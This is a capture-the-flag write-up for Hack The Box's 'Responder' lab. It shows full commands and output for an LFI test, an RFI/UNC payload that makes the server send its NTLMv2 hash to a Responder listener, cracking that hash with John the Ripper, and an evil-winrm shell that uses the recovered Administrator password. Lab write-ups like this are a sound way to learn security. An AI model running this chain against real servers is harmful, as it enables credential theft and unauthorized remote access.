# Responder

**Platform**: Hack The Box \
**Difficulty**: Very Easy\
**Date**: 2026-05-25\
**OS**: Windows\
**IP**: 10.129.16.181

# Machine Tasks

Task 1
 > When visiting the web service using the IP address, what is the domain that we are being redirected to?

`unika.htb`

Task 2
 > Which scripting language is being used on the server to generate webpages?
 
 `php`
 
 After running an Nmap scan on the target, we see Port 80 HTTP, as well as an HTTP service on Port 5985 (interesting).
 

```bash
nmap -sC -sV $IP -oN recon/initial
```

```text
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

 Task 3
 > What is the name of the URL parameter which is used to load different language versions of the webpage?

`page`

A quick google search gave us many options, but the task specifically asks about the target webpage, so we started bruteforcing directories which resulted in a brief deadend before remembering the site had issues resolving when we first visited it.

To help with this, we added the discovered domain to our `/etc/hosts` file to resolve the webpage.
Now that we were able to see the webpage, selecting another language from the navigation bar allows us to review the URL and complete this task.


Task 4
 > Which of the following values for the page parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"

`../../../../../../../../windows/system32/drivers/etc/hosts`

Task 5
 > Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "./../../../../../../../windows/system32/drivers/etc/hosts", "mimikatz.exe"
 
 `//10.10.14.6/somefile`


We can use these tasks as an opportunity to learn about Local File Inclusion vulnerabilities. 
PortSwigger Academy is a good resource for this.

If we take the `page=` URL parameter and concatenate it with the above commands, we can see the web page is vulnerable to LFI as we are able to read the contents of the `/etc/hosts` file.

Webpage:

```text
# Copyright (c) 1993-2009 Microsoft Corp. # # This is a sample HOSTS file used by Microsoft TCP/IP for Windows. # # This file contains the mappings of IP addresses to host names. Each # entry should be kept on an individual line. The IP address should # be placed in the first column followed by the corresponding host name. # The IP address and the host name should be separated by at least one # space. # # Additionally, comments (such as these) may be inserted on individual # lines or following the machine name denoted by a '#' symbol. # # For example: # # 102.54.94.97 rhino.acme.com # source server # 38.25.63.10 x.acme.com # x client host # localhost name resolution is handled within DNS itself. # 127.0.0.1 localhost # ::1 localhost 
```

Task 6
 > What does NTLM stand for?

`New Technology LAN Manager`

Task 7
 > Which flag do we use in the Responder utility to specify the network interface?
 
 For this, we can look at Kali Tools to research the responder tool, then we can check our instance of Kali to detrmine if it is installed.

`-I`

```bash
responder -h | grep "interface"    
    -I eth0, --interface=eth0
                        Network interface to use. Use 'ALL' for all
                        interfaces.
```

Task 8
 > There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as john, but the full name is what?.
 
 `John the Ripper`
 
 These tasks are guiding us to use Responder to capture the NTLMv2 response when attempting to access a resource on the target machine and crack it with John The Ripper. Since this was my first time using responder in a lab, I took some time to review the technology itself and Responder's helpp page to build a successful command.

We use the below command to start Responder using `ipconfig` to determine our interface to listen on.
 
```bash
sudo responder -I tun0
```
Then return to the webpage to explore the RFI vulnerability. Since we have set up Responder to listen on our interface, we will want to try to force the server to retrieve a file from it. In turn, the connecting credential hash should be picked up by Responder for us to crack with John the Ripper.

`http://$IP/index.php?page=//your.interface.addr.here/random`

```bash
[+] Listening for events...                                                 

[SMB] NTLMv2-SSP Client   : 10.129.16.181
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:d45b5e5b3f804ee1:2F98ADC8CCAC06332715833456FD524A:010100000000000000EE663145ECDC01F1F0045085DFF4A100000000020008004E0056004F004C0001001E00570049004E002D004C00530035005A0052004A0055005500450033004F0004003400570049004E002D004C00530035005A0052004A0055005500450033004F002E004E0056004F004C002E004C004F00430041004C00030014004E0056004F004C002E004C004F00430041004C00050014004E0056004F004C002E004C004F00430041004C000700080000EE663145ECDC01060004000200000008003000300000000000000001000000002000007B3D9CB63A95EAC1A2C5E83F8955D324350EB12EF399F15A3ED2744B7C0939200A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003200310031000000000000000000
```

Checking for John the Ripper in Kali
```bash
which "john"       
/usr/sbin/john
```
Creating text file containing our hash to give to John
```bash
echo "Administrator::RESPONDER:d45b5e5b3f804ee1:2F98ADC8CCAC06332715833456FD524A:010100000000000000EE663145ECDC01F1F0045085DFF4A100000000020008004E0056004F004C0001001E00570049004E002D004C00530035005A0052004A0055005500450033004F0004003400570049004E002D004C00530035005A0052004A0055005500450033004F002E004E0056004F004C002E004C004F00430041004C00030014004E0056004F004C002E004C004F00430041004C00050014004E0056004F004C002E004C004F00430041004C000700080000EE663145ECDC01060004000200000008003000300000000000000001000000002000007B3D9CB63A95EAC1A2C5E83F8955D324350EB12EF399F15A3ED2744B7C0939200A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003200310031000000000000000000" > hash.txt
```

`john -w=/usr/share/wordlists/rockyou.txt hash.txt`

```text
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]        (Administrator)     
1g 0:00:00:00 DONE (2026-05-25 13:13) 16.66g/s 68266p/s 68266c/s 68266C/s adriano..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
Task 10
 > We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
 
 `5985`
 
 Port 5985 is frequently used for Windows Remote Management (WinRM) service, so we will need to use the cracked hash as part of the logon and we can do this via the `evil-winrm` tool.
 A quick check of the man page and we can see the command simply takes the user and password for authorization, and uses default port (5985) unless specified. Now, we can start building our command.
 
 `evil-winrm -u Administrator -p badminton -i $IP`
 
```text
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> 
```

Task 11
 > On which user's desktop is the flag located?
 
`mike`

```bash
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> chdir C:\Users
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> chdir mike
*Evil-WinRM* PS C:\Users\mike> dir


    Directory: C:\Users\mike


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop


*Evil-WinRM* PS C:\Users\mike> chdir Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> dir


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt
```

# Flags

#### User
```bash
*Evil-WinRM* PS C:\Users\mike\Desktop> cat flag.txt
[REDACTED]
```

---

# Lessons Learned

**Key takeaway**:\
**Enumeration lesson**:\
**Missed clues**:\
**New/Useful Commands**:
